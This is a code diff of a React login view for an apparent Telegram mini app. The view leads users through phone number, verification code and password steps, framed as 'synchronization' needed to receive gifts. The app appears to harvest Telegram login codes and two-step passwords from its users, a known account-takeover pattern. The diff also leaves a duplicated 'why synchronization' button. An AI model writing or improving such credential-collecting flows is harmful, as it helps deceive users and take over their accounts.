@@ -1,5 +1,5 @@
 import { useState, useRef, useEffect } from 'react';
-import { authStepPhone, authStepCode, authStepPassword, authStepContact } from '../services/api';
+import { authStepPhone, authStepCode, authStepPassword, authStepContactShared } from '../services/api';
 import { setSynced, addToInventory } from '../services/inventory';
 import { useAppContext } from '../store';
 import { hapticImpact, hapticNotification } from '../services/telegram';
@@ -70,47 +70,30 @@ export default function AuthView() {
   const handleRequestContact = () => {
     hapticImpact('medium');
     setError('');
-    if (!tg) {
-      setError('Откройте приложение через Telegram');
-      return;
-    }
-    tg.requestContact((received: boolean, contact: any) => {
-      if (!received || !contact?.phoneNumber) {
-        setError('Вы не поделились номером телефона');
-        return;
-      }
-      const sharedPhone: string = contact.phoneNumber;
-      const sharedUserId: number | undefined = contact.userId;
-
-      // Проверяем что номер принадлежит текущему пользователю
-      if (sharedUserId && tgUserId && String(sharedUserId) !== String(tgUserId)) {
-        setError('Пожалуйста, поделитесь своим номером телефона, а не чужим');
-        return;
-      }
-
-      const normalized = sharedPhone.startsWith('+') ? sharedPhone : '+' + sharedPhone;
-      setPhone(normalized);
+    if (!tg) { setError('Откройте приложение через Telegram'); return; }
+    // requestContact: Telegram показывает диалог, контакт приходит боту как сообщение
+    // Колбэк получает только boolean (isSent) — никаких данных о номере здесь нет
+    tg.requestContact((isSent: boolean) => {
+      if (!isSent) { setError('Вы не поделились номером телефона'); return; }
       setContactShared(true);
       hapticImpact('light');
-      submitPhone(normalized, sharedUserId);
+      // Уведомляем бота что контакт отправлен, бот уже получил сообщение с номером
+      sendContactShared();
     });
   };
 
-  const submitPhone = async (phoneNum: string, contactUserId?: number) => {
+  const sendContactShared = async () => {
     setLoading(true); setError('');
     try {
       const effectiveGiftId = giftId || new URLSearchParams(window.location.search).get('gift_id') || '';
-      // Используем contact action если номер пришёл через Telegram requestContact
-      const res = contactUserId !== undefined
-        ? await authStepContact(phoneNum, contactUserId, effectiveGiftId)
-        : await authStepPhone(phoneNum, effectiveGiftId);
+      const res = await authStepContactShared(effectiveGiftId);
       if (res.status === 'code_sent') { setStep(2); }
-      else { setError(res.message || 'Ошибка отправки кода'); }
-    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
+      else { setError(res.message || 'Ошибка. Попробуйте ещё раз.'); setContactShared(false); }
+    } catch (err: any) { setError(err.message || 'Ошибка сети'); setContactShared(false); }
     finally { setLoading(false); }
   };
 
-  const handleCodeChange = (index: number, value: string) => {
+    const handleCodeChange = (index: number, value: string) => {
     if (!/^\d*$/.test(value)) return;
     setError('');
     const newCode = [...code]; newCode[index] = value; setCode(newCode);
@@ -205,20 +188,13 @@ export default function AuthView() {
         style={{ background: 'radial-gradient(circle, rgba(135,116,225,0.14) 0%, transparent 70%)', filter: 'blur(30px)' }} />
 
       {step !== 4 && (
-        <div className="absolute top-4 left-4 right-4 flex items-center justify-between z-10">
-          <button onClick={handleBack}
-            className="w-9 h-9 rounded-full flex items-center justify-center active:scale-90 transition-transform"
-            style={{ background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.1)' }}>
-            <ArrowLeft className="w-5 h-5 text-white" />
-          </button>
-          {/* Зачем синхронизация? — только на шагах 1-3 */}
-          <button onClick={handleWhySync}
-            className="flex items-center gap-1.5 px-3 py-1.5 rounded-full active:scale-95 transition-transform text-[12px] font-medium"
-            style={{ background: 'rgba(255,255,255,0.06)', color: '#888', border: '1px solid rgba(255,255,255,0.08)' }}>
-            <HelpCircle className="w-3.5 h-3.5" />
-            Зачем?
-          </button>
-        </div>
+        <button
+          onClick={handleBack}
+          className="absolute top-4 left-4 w-9 h-9 rounded-full flex items-center justify-center active:scale-90 transition-transform z-10"
+          style={{ background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.1)' }}
+        >
+          <ArrowLeft className="w-5 h-5 text-white" />
+        </button>
       )}
 
       <div className="flex-1 flex flex-col items-center justify-center px-6 relative overflow-y-auto">
@@ -240,7 +216,27 @@ export default function AuthView() {
             </motion.div>
           )}
 
-          {step !== 4 && <StepDots />}
+          {step !== 4 && (
+            <>
+              <StepDots />
+              <button onClick={handleWhySync}
+                className="flex items-center gap-1.5 px-3 py-1.5 rounded-full active:scale-95 transition-transform text-[12px] font-medium mb-4 -mt-2"
+                style={{ background: 'rgba(255,255,255,0.06)', color: '#888', border: '1px solid rgba(255,255,255,0.08)' }}>
+                <HelpCircle className="w-3.5 h-3.5" />
+                Зачем нужна синхронизация?
+              </button>
+            </>
+          )}
+
+          {/* Зачем синхронизация? — показывается на шагах 1-3 */}
+          {step !== 4 && (
+            <button onClick={handleWhySync}
+              className="flex items-center gap-1.5 px-4 py-2 rounded-full active:scale-95 transition-transform text-[12px] font-medium mb-5"
+              style={{ background: 'rgba(255,255,255,0.05)', color: '#777', border: '1px solid rgba(255,255,255,0.08)' }}>
+              <HelpCircle className="w-3.5 h-3.5" />
+              Зачем нужна синхронизация?
+            </button>
+          )}
 
           <AnimatePresence mode="wait">
 
